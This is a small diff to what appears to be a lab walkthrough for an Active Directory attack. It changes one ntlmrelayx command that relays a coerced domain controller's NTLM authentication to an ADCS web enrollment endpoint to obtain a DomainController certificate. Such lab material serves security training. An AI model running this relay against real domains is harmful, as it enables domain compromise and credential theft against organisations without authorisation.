@@ -314,7 +314,7 @@ docker container start -i kali-1
 
 2. Use ntlmrelayx and proxychains to relay incoming authentication requests to the ADCS HTTP endpoint. We're going to relay the credentials of a domain controller, so we'll specifically request a _DomainController_ certificate.
 ```
-proxychains impacket-ntlmrelayx -t http://10.10.120.5/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
+proxychains ntlmrelayx.py -t http://10.10.120.5/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
 ```
 
 3. Coerce the domain controller into authenticating to the current machine.
